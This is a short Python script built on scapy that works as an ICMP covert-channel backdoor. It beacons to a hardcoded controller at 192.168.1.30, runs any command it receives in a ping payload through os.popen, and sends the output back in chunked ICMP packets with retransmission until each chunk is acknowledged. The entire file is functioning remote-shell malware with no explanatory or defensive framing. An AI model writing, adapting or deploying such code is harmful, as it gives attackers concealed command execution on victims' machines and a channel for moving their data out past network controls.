import sys
import os
import time
from scapy.all import *


def RequestHandler(pkt):
    mtu = 1400
    cmd = pkt[0].load.decode('utf-8')
    res = os.popen(cmd).read()

    if (len(res) > mtu):
        res = "2" + res
        print("2")
        for i in range(0, len(res), mtu):
            data = res[i:i+mtu]
            print(data)
            time.sleep(1)
            SendPacket(data, pkt, i)
            while True:
                print("Listen..")
                pkt_res = sniff(filter=f"icmp", count=1, timeout=3)
                print("packet: ", pkt_res[0].load.decode('utf-8'))
                if (pkt_res[0].load.decode('utf-8') == "ok" and pkt_res[0].seq == i):
                    break
                SendPacket(data, pkt, i)
            if i + mtu > len(res):
                SendPacket("f" + data, pkt, i)

    else:
        res = "1" + res
        time.sleep(1)
        SendPacket(res, pkt, pkt[0].seq)
        while True:
            pkt_res = sniff(filter=f"icmp", count=1, timeout=3)
            if (pkt_res[0].load.decode('utf-8') == "ok"):
                print("check ok")
                break
            SendPacket(res, pkt, pkt[0].seq)


def SendPacket(msg, pkt, seq):
    send(IP(dst=pkt[IP].src, src=pkt[IP].dst)/ICMP(type=8, seq=seq)/(f'{msg}'))


def Beaconing(ip_dst):
    try:
        while True:
            send(IP(dst=ip_dst)/ICMP(type=8)/("0hello"))
            sniff(filter=f"icmp", prn=RequestHandler, count=1, timeout=5)
    except KeyboardInterrupt:
        print("bye bye")



if __name__ == '__main__':
    ip_dst = "192.168.1.30"
    Beaconing(ip_dst)